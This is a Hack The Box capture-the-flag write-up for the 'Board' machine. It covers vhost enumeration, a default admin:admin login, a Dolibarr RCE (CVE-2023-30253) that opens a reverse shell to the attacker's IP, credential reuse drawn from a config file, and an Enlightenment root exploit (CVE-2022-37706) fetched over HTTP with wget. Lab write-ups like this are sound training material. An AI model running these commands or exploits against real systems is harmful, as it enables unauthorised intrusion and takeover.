# Hack The Box - Board Writeup

## Summary

| Phase | Technique |
|--------|-----------|
| Enumeration | Nmap + Virtual Host Enumeration |
| Initial Access | Default Credentials |
| Foothold | Dolibarr 17.0.0 RCE (CVE-2023-30253) |
| Lateral Movement | Reused Database Credentials |
| Privilege Escalation | Enlightenment 0.23.1 (CVE-2022-37706) |
| Result | Root |

---

# Enumeration

## 1. Initial Scan

Started with a default Nmap scan to identify exposed services.

```bash
nmap -sV -sC -T3 10.129.231.37
```

Results:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Only two services were exposed:

- **22/tcp** - SSH
- **80/tcp** - Apache Web Server

The web server became the primary focus for further enumeration.

---

## 2. Discover the Domain

Browsing the website revealed the domain name at the bottom of the page.

```
board.htb
```

Added it to `/etc/hosts` before continuing.

---

## 3. Virtual Host Enumeration

Enumerated virtual hosts using Gobuster.

```bash
gobuster vhost \
-u http://board.htb \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
--append-domain
```

Discovered:

```
crm.board.htb
```

Added the new virtual host to `/etc/hosts`.

---

## 4. Login with Default Credentials

Browsing to:

```
http://crm.board.htb
```

The application accepted the default credentials:

```
Username: admin
Password: admin
```

Successfully authenticated into the CRM.

---

# Initial Foothold

## 5. Exploit Dolibarr (CVE-2023-30253)

The application was identified as:

```
Dolibarr 17.0.0
```

This version is vulnerable to **CVE-2023-30253**, allowing Remote Code Execution.

Download the public PoC:

```
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py
```

Execute the exploit:

```bash
python3 exploit.py "http://crm.board.htb" admin admin 10.10.16.199 4444
```

A reverse shell was obtained.

---

# Post Exploitation

## 6. Inspect Configuration Files

After gaining shell access, inspect the Dolibarr configuration.

```bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

Database credentials were found:

```php
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```

---

## 7. Enumerate Users

Check local users.

```bash
ls /home/
```

Output:

```
larissa
```

---

## 8. SSH as Larissa

The database password is reused for the local account.

```bash
ssh larissa@board.htb
```

Password:

```
serverfun2$2023!!
```

A stable SSH session is established.

---

# Privilege Escalation

## 1. Enumerate SUID Binaries

Search for SUID executables.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Interesting findings:

```text
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
```

Multiple Enlightenment binaries suggested checking its version.

---

## 2. Identify the Installed Version

```bash
enlightenment --version
```

Output:

```text
Version: 0.23.1
```

Searching for known vulnerabilities revealed **CVE-2022-37706**, a Local Privilege Escalation vulnerability affecting this version.

---

## 3. Exploit CVE-2022-37706

Download the exploit:

```
https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh
```

Host it locally:

```bash
python3 -m http.server 5555
```

Transfer it to the target:

```bash
wget http://10.10.16.199:5555/exploit.sh
```

Make it executable:

```bash
chmod +x exploit.sh
```

Run the exploit:

```bash
./exploit.sh
```

A root shell is obtained.

---

# Capture the Flag

Read the root flag:

```bash
cat /root/root.txt
```

---

# Attack Path

```text
Nmap Scan
     │
     ▼
Apache Web Server
     │
     ▼
board.htb
     │
     ▼
VHost Enumeration
     │
     ▼
crm.board.htb
     │
     ▼
Default Credentials
(admin:admin)
     │
     ▼
Dolibarr 17.0.0
(CVE-2023-30253)
     │
     ▼
Reverse Shell
     │
     ▼
conf.php
     │
     ▼
Database Credentials
     │
     ▼
SSH as larissa
     │
     ▼
SUID Enumeration
     │
     ▼
Enlightenment 0.23.1
(CVE-2022-37706)
     │
     ▼
Root
```

---

# Key Takeaways

- Begin with broad enumeration before moving to targeted testing.
- Virtual host enumeration can reveal hidden applications that are not visible from the primary website.
- Always try default credentials against administrative interfaces.
- Configuration files frequently contain sensitive credentials that may be reused elsewhere.
- Password reuse often enables movement from a web shell to a stable SSH session.
- Enumerating SUID binaries is a fundamental privilege escalation technique.
- Verify software versions whenever uncommon binaries are discovered, as publicly available exploits may exist.
